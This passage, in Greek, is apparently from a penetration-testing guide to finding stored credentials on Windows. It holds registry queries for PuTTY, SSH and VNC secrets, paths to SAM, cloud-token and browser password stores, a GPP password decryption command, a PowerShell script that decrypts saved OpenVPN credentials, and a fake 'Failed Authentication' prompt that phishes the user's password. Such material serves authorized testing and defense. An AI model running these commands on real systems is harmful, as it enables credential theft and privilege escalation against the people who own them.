κώδικα. Δείτε τον [οδηγό εγκατάστασης και διαχείρισης plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) του προμηθευτή και την [ιδιότητα API μεταφόρτωσης plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Διαμόρφωση forensic management server

Οι διαμορφώσεις server του Velociraptor, που συνήθως ονομάζονται `server.config.yaml`, μπορεί να περιέχουν το `CA.private_key` της εσωτερικής CA. Αν ένας χρήστης με χαμηλότερα προνόμια μπορεί να διαβάσει αυτό το key, ενδέχεται να μπορεί να δημιουργήσει πιστοποιητικό client API. Το αν αυτό οδηγεί σε υψηλότερα προνόμια εξαρτάται από τους ρόλους χρηστών του server, την προσβασιμότητα του API και την ταυτότητα με την οποία εκτελείται ο server ή ο agent-στόχος. Μια διαμόρφωση client περιέχει διαφορετικό υλικό· η εύρεσή της δεν αποδεικνύει πρόσβαση στην CA του server. Ορισμένες εγκαταστάσεις διατηρούν το private key της CA εκτός σύνδεσης, επομένως μια αναγνώσιμη διαμόρφωση server μπορεί επίσης να μην περιέχει το key υπογραφής.

Σε Windows server, εξετάστε τα ACL της διαμόρφωσης **του server** στον κατάλογο εγκατάστασής του και τυχόν προστατευμένα αντίγραφα ασφαλείας. Μια πιθανή θέση είναι `%ProgramFiles%\VelociraptorServer\server.config.yaml`· χρησιμοποιήστε τη διαδρομή που έχει ρυθμιστεί στην υπηρεσία, αν διαφέρει. Επιβεβαιώστε ότι η τρέχουσα ταυτότητα μπορεί να διαβάσει το αρχείο και ότι πράγματι υπάρχει το `CA.private_key`. Αποφύγετε την εμφάνιση του private key σε logs ή σε αποτελέσματα απαρίθμησης. Η ροή εργασίας `config api_client` του προμηθευτή χρησιμοποιεί το key της CA για την έκδοση πιστοποιητικού client, αλλά απαιτείται επίσης κατάλληλος ρόλος από την πλευρά του server· η δημιουργία ή τροποποίησή του μπορεί να απαιτεί δικαίωμα εγγραφής στο datastore ή επανεκκίνηση. Μια υπάρχουσα ταυτότητα server με υψηλά προνόμια μπορεί να προσφέρει διαδρομή ακόμη και όταν αυτές οι εγγραφές δεν είναι διαθέσιμες. Τα API queries με δικαιώματα εκτέλεσης εκτελούνται στο σχετικό πλαίσιο server ή agent, το οποίο μπορεί να έχει υψηλά προνόμια.

Προστατεύστε τη διαμόρφωση του server και τα αντίγραφα ασφαλείας με περιοριστικά ACL, διατηρείτε το signing key της CA εκτός σύνδεσης όπου είναι δυνατόν και περιορίστε τους ρόλους API και την πρόσβαση στους listeners. Δείτε την [τεκμηρίωση API του Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) και τις [οδηγίες διαμόρφωσης ασφαλείας](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Το Solar-PuTTY είναι ξεχωριστός διαχειριστής συνεδριών. Το εγγενές κρυπτογραφημένο αποθετήριό του μπορεί να βρίσκεται στη διαδρομή `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, ενώ ένα εξαγόμενο αντίγραφο ασφαλείας συνεδριών μπορεί να ονομάζεται `sessions-backup.dat` και να είναι αποθηκευμένο αλλού. Ο [οδηγός εξαγωγής της SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) αναφέρει ότι οι εξαγωγές κρυπτογραφούνται με κωδικό πρόσβασης και μπορούν να περιλαμβάνουν συνεδρίες, κλειδιά, scripts, ετικέτες και σχέσεις· το [φόρουμ υποστήριξής της](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) προσδιορίζει το εγγενές αποθετήριο. Ελέγξτε πρώτα τα δικαιώματα αρχείων και τις διαδρομές. Η εύρεση οποιουδήποτε από τα δύο αρχεία δεν αποκαλύπτει τον κωδικό πρόσβασής του ούτε αποδεικνύει ότι τυχόν αποθηκευμένα διαπιστευτήρια εξακολουθούν να είναι έγκυρα ή να παρέχουν αυξημένα προνόμια.

### Κλειδιά κεντρικού υπολογιστή SSH του PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Κλειδιά SSH στο μητρώο

Τα ιδιωτικά κλειδιά SSH μπορούν να αποθηκευτούν στο κλειδί μητρώου `HKCU\Software\OpenSSH\Agent\Keys`, επομένως θα πρέπει να ελέγξετε αν υπάρχει κάτι ενδιαφέρον εκεί:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Αν βρείτε κάποια καταχώριση σε αυτή τη διαδρομή, πιθανότατα πρόκειται για αποθηκευμένο SSH key. Είναι αποθηκευμένο κρυπτογραφημένο, αλλά μπορεί να αποκρυπτογραφηθεί εύκολα με το [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Περισσότερες πληροφορίες σχετικά με αυτή την τεχνική εδώ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Αν η υπηρεσία `ssh-agent` δεν εκτελείται και θέλετε να ξεκινά αυτόματα κατά την εκκίνηση, εκτελέστε:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Φαίνεται ότι αυτή η τεχνική δεν είναι πλέον έγκυρη. Προσπάθησα να δημιουργήσω μερικά ssh keys, να τα προσθέσω με το `ssh-add` και να συνδεθώ μέσω ssh σε ένα μηχάνημα. Το μητρώο HKCU\Software\OpenSSH\Agent\Keys δεν υπάρχει και το procmon δεν εντόπισε τη χρήση του `dpapi.dll` κατά την αυθεντικοποίηση με ασύμμετρο κλειδί.

### Αρχεία unattended

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Μπορείτε επίσης να αναζητήσετε αυτά τα αρχεία χρησιμοποιώντας το **metasploit**: _post/windows/gather/enum_unattend_

Παράδειγμα περιεχομένου:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Αντίγραφα ασφαλείας SAM & SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Αναγνώσιμα αρχεία αντιγράφων ασφαλείας Windows Imaging (`.wim`) μπορεί επίσης να περιέχουν offline hives `SAM`, `SECURITY` και `SYSTEM`. Δώστε προτεραιότητα σε τοπικά προσβάσιμους καταλόγους αντιγράφων ασφαλείας ή εικόνων και ελέγξτε τα **ονόματα μελών** μιας εικόνας πριν από την εξαγωγή οτιδήποτε· το όνομα αρχείου `.wim` από μόνο του δεν αποδεικνύει ότι εκτίθενται hives, ενώ τα συνηθισμένα `install.wim`, `boot.wim` και οι εικόνες αποκατάστασης συχνά αποτελούν παραπλανητικά ευρήματα. Ένα SMB share είναι ξεχωριστή οδός πρόσβασης και πρέπει να ελέγχεται μόνο όταν βρίσκεται εντός πεδίου. Δείτε τις [οδηγίες της Microsoft για τις εικόνες Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) και την [αναφορά αρχείων registry hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Διαπιστευτήρια Cloud

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Αναζητήστε ένα αρχείο με όνομα **SiteList.xml**

### Αποθηκευμένος στην cache κωδικός πρόσβασης GPP

Υπήρχε παλαιότερα μια δυνατότητα που επέτρεπε την ανάπτυξη προσαρμοσμένων τοπικών λογαριασμών διαχειριστή σε μια ομάδα μηχανημάτων μέσω του Group Policy Preferences (GPP). Ωστόσο, αυτή η μέθοδος είχε σημαντικά κενά ασφαλείας. Πρώτον, τα Group Policy Objects (GPOs), τα οποία αποθηκεύονταν ως αρχεία XML στο SYSVOL, ήταν προσβάσιμα από οποιονδήποτε χρήστη του domain. Δεύτερον, οι κωδικοί πρόσβασης μέσα σε αυτά τα GPP, κρυπτογραφημένοι με AES256 χρησιμοποιώντας ένα δημόσια τεκμηριωμένο προεπιλεγμένο κλειδί, μπορούσαν να αποκρυπτογραφηθούν από οποιονδήποτε πιστοποιημένο χρήστη. Αυτό αποτελούσε σοβαρό κίνδυνο, καθώς μπορούσε να επιτρέψει στους χρήστες να αποκτήσουν αυξημένα προνόμια.

Για τον περιορισμό αυτού του κινδύνου, αναπτύχθηκε μια συνάρτηση που αναζητά τοπικά αποθηκευμένα στην cache αρχεία GPP τα οποία περιέχουν ένα πεδίο "cpassword" με μη κενή τιμή. Όταν εντοπίζει ένα τέτοιο αρχείο, η συνάρτηση αποκρυπτογραφεί τον κωδικό πρόσβασης και επιστρέφει ένα προσαρμοσμένο αντικείμενο PowerShell. Αυτό το αντικείμενο περιλαμβάνει λεπτομέρειες σχετικά με το GPP και τη θέση του αρχείου, διευκολύνοντας τον εντοπισμό και την αποκατάσταση αυτής της ευπάθειας ασφαλείας.

Αναζητήστε αυτά τα αρχεία στο `C:\ProgramData\Microsoft\Group Policy\history` ή στο _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (πριν από τα Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Για να αποκρυπτογραφήσετε το cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Χρήση του crackmapexec για την απόκτηση των κωδικών πρόσβασης:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Παράδειγμα του web.config με διαπιστευτήρια:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Αντίγραφα ασφαλείας σε ZIP στο webroot του IIS

Ένα παλιό αντίγραφο ασφαλείας ZIP, τοποθετημένο απευθείας σε webroot που εξυπηρετείται, μπορεί να αποκαλύψει παλαιότερα αρχεία ρυθμίσεων και επαναχρησιμοποιήσιμα credentials. Ελέγξτε τη διαμορφωμένη φυσική διαδρομή του ιστότοπου και αν το αρχείο είναι πράγματι προσβάσιμο μέσω HTTP, προτού το θεωρήσετε έκθεση. Η προεπιλεγμένη διαδρομή `C:\inetpub\wwwroot` είναι απλώς μια πιθανή επιλογή. Μια γρήγορη τοπική καταγραφή μπορεί να εμφανίσει ονόματα και μεγέθη χωρίς να ανοίξει τα αρχεία:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Το όνομα ενός αρχείου αρχειοθέτησης δεν αποδεικνύει ότι περιέχει κάποιο μυστικό ούτε ότι ένα ανακτημένο διαπιστευτήριο παρέχει αυξημένα δικαιώματα.

### Διαπιστευτήρια OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Αρχεία καταγραφής

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Ζητήστε διαπιστευτήρια

Μπορείτε πάντα να **ζητήσετε από τον χρήστη να εισαγάγει τα δικά του διαπιστευτήρια ή ακόμα και τα διαπιστευτήρια κάποιου άλλου χρήστη**, αν πιστεύετε ότι μπορεί να τα γνωρίζει (έχετε υπόψη ότι το να **ζητήσετε** απευθείας από τον πελάτη τα **διαπιστευτήριά** του είναι πραγματικά **επικίνδυνο**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Πιθανά ονόματα αρχείων που περιέχουν διαπιστευτήρια**

Γνωστά αρχεία που κάποτε περιείχαν **passwords** σε **clear-text** ή **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Οι βάσεις δεδομένων Password Safe v3 χρησιμοποιούν συνήθως την επέκταση `.psafe3`. Αντιμετωπίστε ένα αρχείο με αντίστοιχο όνομα ως πιθανό κρυπτογραφημένο θησαυροφυλάκιο· η παρουσία του δεν αποδεικνύει ότι μπορείτε να το διαβάσετε, να το ξεκλειδώσετε ή να χρησιμοποιήσετε τα αποθηκευμένα διαπιστευτήρια. Κατά τον έλεγχο της θέσης αποθήκευσης τέτοιων αρχείων, ελέγξτε τα προσβάσιμα προφίλ χρηστών και τους διαμορφωμένους ριζικούς καταλόγους κοινής χρήσης αρχείων.

Ένα αναγνώσιμο αρχείο KeePass `.kdbx` αποτελεί επίσης απλώς ένδειξη ύπαρξης κρυπτογραφημένου θησαυροφυλακίου. Για να το ξεκλειδώσετε απαιτούνται ο πραγματικός κύριος κωδικός πρόσβασης και τυχόν διαμορφωμένα αρχεία κλειδιών ή παράγοντες λογαριασμού. Αν ένας εξουσιοδοτημένος έλεγχος εντοπίσει σε μια καταχώριση ζεύγος κατακερματισμών LM:NT, επαληθεύστε τον κατονομαζόμενο λογαριασμό και αν ο κατακερματισμός NT είναι ενημερωμένος και γίνεται αποδεκτός από την υπηρεσία NTLM του στόχου, πριν εξετάσετε το ενδεχόμενο χρήσης του [pass-the-hash](../ntlm/README.md#pass-the-hash). Μια καταχώριση στο θησαυροφυλάκιο δεν παρέχει από μόνη της δικαιώματα Administrator ή SYSTEM· πρέπει επίσης να ισχύουν η πρόσβαση στην απομακρυσμένη υπηρεσία, τα δικαιώματα του λογαριασμού και τυχόν ξεχωριστό βήμα εκτέλεσης υπηρεσίας. Η απογραφή πρέπει να αναφέρει τη διαδρομή του θησαυροφυλακίου και αν είναι αναγνώσιμο, όχι να εμφανίζει τη βάση δεδομένων ή τα αποθηκευμένα διαπιστευτήρια.

Αναζητήστε όλα τα προτεινόμενα αρχεία:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Διαπιστευτήρια στον Κάδο Ανακύκλωσης

Ελέγξτε τις προσβάσιμες καταχωρίσεις του Κάδου Ανακύκλωσης για διαγραμμένα αντίγραφα ασφαλείας και αρχεία ρυθμίσεων, καθώς και για αρχεία των οποίων τα ονόματα αναφέρουν ρητά διαπιστευτήρια. Ένα χρήσιμο αντίγραφο ασφαλείας `.7z`, `.zip` ή `.rar` μπορεί να είναι μηνών και να έχει ένα συνηθισμένο όνομα αρχείου. Τα Windows αποθηκεύουν την αρχική διαδρομή και τον χρόνο διαγραφής σε μια εγγραφή `$I` και το διαγραμμένο αρχείο ως το αντίστοιχο στοιχείο `$R`. Ελέγξτε τα μεταδεδομένα και αν η τρέχουσα ταυτότητα έχει δικαίωμα ανάγνωσης πριν ανοίξετε ένα αρχείο. Η ορατότητα εξαρτάται από τον τόμο, το SID του χρήστη και τα δικαιώματα αρχείων, επομένως μια κενή λίστα δεν αποδεικνύει ότι δεν υπάρχει ανακτήσιμο αντίγραφο ασφαλείας. Αντιμετωπίστε το όνομα ενός αρχείου ως υποψήφιο για έλεγχο, όχι ως απόδειξη ότι περιέχει έγκυρο μυστικό.

Ένα προσβάσιμο διαγραμμένο `.pfx` μπορεί επίσης να αποτελέσει στοιχείο για **code-signing**. Αν περιέχει προσβάσιμο ιδιωτικό κλειδί, το κλειδί μπορεί να υπογράψει ένα τροποποιημένο script PowerShell. Το [PowerShell απαιτεί πιστοποιητικό code-signing με ιδιωτικό κλειδί](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), ενώ οι [κανόνες εκδότη του AppLocker αξιολογούν την ταυτότητα του υπογράφοντος και το πεδίο εφαρμογής του κανόνα](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Η εκτέλεση μεταξύ λογαριασμών απαιτεί η τρέχουσα ταυτότητα να μπορεί να τροποποιήσει το συγκεκριμένο script, να υπάρχει ένας κανόνας σε ισχύ που αποδέχεται την προκύπτουσα υπογραφή για το script και τον λογαριασμό-στόχο, καθώς και μια προγραμματισμένη εργασία ή άλλος καταναλωτής με υψηλότερα προνόμια που πράγματι το εκτελεί. Ένα όνομα αρχείου `.pfx`, το θέμα ενός πιστοποιητικού ή ένα εγγράψιμο script από μόνο του δεν τεκμηριώνει αυτή την αλυσίδα. Ελέγξτε τα μεταδεδομένα, τις ACL, την πολιτική και την προγραμματισμένη εντολή πριν ανοίξετε υλικό ιδιωτικού κλειδιού ή ενεργοποιήσετε την εργασία.

Ελέγξτε επίσης τις προσβάσιμες βάσεις δεδομένων προφίλ, τις σημειώσεις και τα ληφθέντα αρχεία εφαρμογών ανταλλαγής μηνυμάτων για στοιχεία σχετικά με διαπιστευτήρια. Μια εξαγωγή κλειδιού ανάκτησης BitLocker μπορεί να είναι αποθηκευμένη ως HTML ή TXT, μερικές φορές μέσα σε ένα επώνυμο αρχείο αντιγράφου ασφαλείας. Αυτό το υλικό μπορεί να παρέχει πρόσβαση σε έναν ξεχωριστό κρυπτογραφημένο τόμο δεδομένων που περιέχει παλαιότερα αντίγραφα ασφαλείας. Ελέγξτε τον τόμο και το αρχείο μόνο εφόσον έχετε εξουσιοδότηση πρόσβασης. Αν ένα αντίγραφο ασφαλείας περιλαμβάνει `NTDS.dit`, η ανάκτηση διαπιστευτηρίων τομέα εκτός σύνδεσης απαιτεί επίσης την αντίστοιχη ομάδα μητρώου `SYSTEM`, όπως περιγράφεται στη [ροή εργασίας αντιγράφων ασφαλείας και προνομιούχων ομάδων](../active-directory-methodology/privileged-groups-and-token-privileges.md). Τα ονόματα αρχείων και ένας κλειδωμένος τόμος από μόνα τους δεν αποδεικνύουν ότι υπάρχει αξιοποιήσιμο κλειδί ανάκτησης ή αντίγραφο ασφαλείας τομέα.

Για να **ανακτήσετε κωδικούς πρόσβασης** που έχουν αποθηκευτεί από διάφορα προγράμματα, μπορείτε να χρησιμοποιήσετε: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Μέσα στο μητρώο

**Άλλα πιθανά κλειδιά μητρώου με διαπιστευτήρια**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Εξαγωγή κλειδιών openssh από το registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Ιστορικό προγραμμάτων περιήγησης

Θα πρέπει να αναζητήσετε βάσεις δεδομένων όπου αποθηκεύονται κωδικοί πρόσβασης από το **Chrome, Edge ή Firefox**.\
Ελέγξτε επίσης το ιστορικό, τους σελιδοδείκτες και τα αγαπημένα των προγραμμάτων περιήγησης, καθώς μπορεί να είναι αποθηκευμένοι εκεί κάποιοι **κωδικοί πρόσβασης**.

Για το συμβατικό προφίλ **Default** του Edge του τρέχοντος χρήστη, το `Login Data` βρίσκεται στο `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, ενώ το `Local State` βρίσκεται στον γονικό κατάλογο `User Data`. [Η Microsoft τεκμηριώνει την προεπιλεγμένη τοποθεσία του προφίλ](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars)· ένα άλλο προφίλ ή μια πολιτική `UserDataDir` μπορεί να αλλάξει αυτήν την τοποθεσία. Η ύπαρξη αρχείων αποτελεί μόνο ένδειξη για πιθανή αποθήκευση διαπιστευτηρίων: επιβεβαιώστε ότι τα αρχεία είναι αναγνώσιμα, ότι διαθέτετε το πλαίσιο DPAPI του αντίστοιχου χρήστη ή άλλο εξουσιοδοτημένο υλικό κλειδιών, καθώς και αν μια αποθηκευμένη σύνδεση ανήκει σε λογαριασμό με περισσότερα προνόμια. Η απαρίθμηση μόνο των διαδρομών δεν απαιτεί άνοιγμα της βάσης δεδομένων ή εμφάνιση αποκρυπτογραφημένων κωδικών πρόσβασης.

Για το Firefox, [η Mozilla τεκμηριώνει](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) ότι τα `key4.db` και `logins.json` ενός προφίλ είναι τα αντίστοιχα αρχεία κλειδιών και κρυπτογραφημένων συνδέσεων. Η ύπαρξή τους αποτελεί μόνο ένδειξη: ελέγξτε αν είναι και τα δύο αρχεία αναγνώσιμα, αν υπάρχουν αποθηκευμένες καταχωρίσεις και αν ένα Primary Password προστατεύει το κλειδί, προτού συμπεράνετε ότι τα διαπιστευτήρια μπορούν να χρησιμοποιηθούν. Αν ένα διαπιστευτήριο που ανακτήθηκε ανήκει σε λογαριασμό τομέα, ελέγξτε ξεχωριστά τα πραγματικά δικαιώματα ελέγχου ομάδων του λογαριασμού και τα [δικαιώματα ανάγνωσης ή αποκρυπτογράφησης κωδικών πρόσβασης LAPS](../active-directory-methodology/laps.md) της ομάδας· τα ευρήματα από το πρόγραμμα περιήγησης από μόνα τους δεν τεκμηριώνουν δυνατότητα απόκτησης δικαιωμάτων διαχειριστή.

Εργαλεία για την εξαγωγή κωδικών πρόσβασης από προγράμματα περιήγησης:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Το **Component Object Model (COM)** είναι μια τεχνολογία ενσωματωμένη στο λειτουργικό σύστημα Windows, η οποία επιτρέπει την **επικοινωνία** μεταξύ στοιχείων λογισμικού γραμμένων σε διαφορετικές γλώσσες. Κάθε στοιχείο COM **αναγνωρίζεται μέσω ενός class ID (CLSID)** και εκθέτει λειτουργίες μέσω μίας ή περισσότερων διεπαφών, οι οποίες αναγνωρίζονται μέσω interface ID (IID).

Οι κλάσεις και οι διεπαφές COM ορίζονται στο registry, αντίστοιχα, στα **HKEY\CLASSES\ROOT\CLSID** και **HKEY\CLASSES\ROOT\Interface**. Αυτό το registry δημιουργείται με τη συγχώνευση των **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Μέσα στα CLSID αυτού του registry μπορείτε να βρείτε το θυγατρικό registry **InProcServer32**, το οποίο περιέχει μια **προεπιλεγμένη τιμή** που δείχνει σε ένα **DLL** και μια τιμή με όνομα **ThreadingModel**, η οποία μπορεί να είναι **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single ή Multi) ή **Neutral** (Thread Neutral).

![Ιστορικό προγραμμάτων περιήγησης - COM DLL Overwriting: Μέσα στα CLSID αυτού του registry μπορείτε να βρείτε το θυγατρικό registry InProcServer32, το οποίο περιέχει μια προεπιλεγμένη τιμή που δείχνει σε ένα DLL και μια τιμή...](<../../images/image (729).png>)

Με λίγα λόγια, αν μπορείτε να **αντικαταστήσετε οποιοδήποτε από τα DLL** που πρόκειται να εκτελεστούν, θα μπορούσατε να **κλιμακώσετε τα προνόμιά σας**, αν αυτό το DLL πρόκειται να εκτελεστεί από διαφορετικό χρήστη.

Για να μάθετε πώς χρησιμοποιούν οι επιτιθέμενοι το COM Hijacking ως μηχανισμό persistence, δείτε:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Γενική αναζήτηση κωδικών πρόσβασης σε αρχεία και registry**

**Αναζήτηση στα περιεχόμενα αρχείων**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Αναζήτηση αρχείου με συγκεκριμένο όνομα**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Αναζητήστε στο μητρώο ονόματα κλειδιών και κωδικούς πρόσβασης**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Εργαλεία που αναζητούν κωδικούς πρόσβασης

